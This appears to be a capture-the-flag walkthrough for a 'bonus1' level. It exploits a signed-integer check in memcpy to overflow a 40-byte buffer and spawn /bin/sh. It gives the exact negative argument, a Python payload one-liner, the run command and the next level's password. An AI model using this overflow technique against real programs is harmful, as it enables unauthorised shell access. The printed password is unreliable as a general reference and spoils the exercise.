# Bonus 1 Walkthrough

## Disassembly
```asm
int main(int argc, char **argv) {
    int count = atoi(argv[1]);
    if (count > 9) return 1;
    memcpy(dest, argv[2], count * 4);
    if (count == 0x574F4C46)    // 'FLOW'
        execl("/bin/sh", "sh", 0);
}
```
`dest` is a 40-byte stack buffer (`sub esp, 0x40`), and `count` is stored at `[esp+0x3c]`. The key bug: `count` is treated as signed for the `atoi` result but only checked with `jle` (≤9). Negative numbers pass the test and, when multiplied by 4, wrap to large positive values due to unsigned arithmetic in `memcpy`.

## Vulnerability
- `memcpy(dest, argv[2], count * 4)` trusts the signed integer without bounds checking.
- With `count = 0x8000000B` (−2147483637), `count * 4 = 0x2C` (44 decimal), so `memcpy` copies 44 bytes into a 40-byte buffer, overwriting the saved `count` stored at `[esp+0x3c]`.
- Overwriting that saved `count` with `0x574F4C46` ensures the comparison succeeds and `/bin/sh` is launched.

## Exploit Steps
1. Use a negative number whose low bits produce the desired copy length:
   ```bash
   COUNT=-2147483637   # 0x8000000B
   ```
2. Create payload: 40 bytes of padding + `"FLOW"` in little endian (`0x574F4C46`):
   ```python
   python3 -c 'import sys,struct; sys.stdout.buffer.write(b"A"*40 + struct.pack("<I", 0x574F4C46))'
   ```
3. Run the program:
   ```bash
   ./bonus1 -2147483637 "$(python3 payload.py)"
   ```
4. Upon return from `memcpy`, the saved `count` becomes `0x574F4C46`, the equality check succeeds, and `execl("/bin/sh", "sh", 0)` executes.

## Flag
```bash
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```
